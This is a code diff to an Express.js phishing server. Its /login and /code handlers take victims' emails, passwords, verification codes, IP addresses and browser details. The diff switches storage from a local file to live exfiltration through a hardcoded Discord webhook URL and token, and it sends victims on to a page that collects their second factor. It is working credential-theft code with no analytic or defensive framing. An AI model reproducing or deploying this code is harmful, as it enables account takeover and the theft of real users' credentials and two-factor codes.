@@ -1,9 +1,12 @@
 const express = require("express");
 const bodyParser = require("body-parser");
-const fs = require("fs"); // Import File System module
+const axios = require("axios")
+
 const app = express();
 
+const webhookURL = "https://discord.com/api/webhooks/1342084759517397083/YjZTFI3rhXgs5e2nr3Vk47FWyZo8_PJtwkXoj4DFFdnnpLrHSQsIpGMJyyrkm6hXEIhl"
 const PORT = process.env.PORT || 3000;
+
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use("/", express.static("views/"));
@@ -13,24 +16,24 @@ function getUserIP(req) {
     return req.headers["x-forwarded-for"] || req.connection.remoteAddress;
 }
 
-// Function to save data to a file
-function saveToFile(data) {
-    const log = `${new Date().toISOString()} - ${data}\n`; // Format data with timestamp
-    fs.appendFile("user_data.txt", log, (err) => {
-        if (err) console.error("Error saving data:", err);
-    });
+function sendDiscord(data) {
+    axios.post(webhookURL, { content: data })
+  .then(() => console.log("Message sent!"))
+  .catch(err => console.error("Error:", err));
 }
 
 app.post("/login", (req, res) => {
-    const { email, password } = req.body;
-    const ip = getUserIP(req);
-    const userAgent = req.headers["user-agent"]; // Get browser info
+    let { email, password } = req.body;
+    let ip = getUserIP(req);
+    let userAgent = req.headers["user-agent"]; // Get browser info
 
-    console.log(req.body);
-    
-    // Save email, password, IP, and browser info
-    saveToFile(`IP: ${ip}, Browser: ${userAgent}, Email: ${email}, Password: ${password}`);
-    
+    let data = `EMAIL: ${email}
+PASSWORD: ${password}
+IP: ${ip}
+UserAgent: ${userAgent}
+`
+
+    sendDiscord(data)
     // Redirect after 5 seconds
     setTimeout(() => {
         res.redirect("verification.html");
@@ -42,10 +45,12 @@ app.post("/code", (req, res) => {
     const ip = getUserIP(req);
     const userAgent = req.headers["user-agent"];
 
-    console.log(req.body);
+    let data = `CODE: ${code}
+IP: ${ip}
+UserAgent: ${userAgent}`
+
+    sendDiscord(data)
     
-    // Save verification code with IP & browser info
-    saveToFile(`IP: ${ip}, Browser: ${userAgent}, Verification Code: ${code}`);
     
     res.status(200).send("");
 });
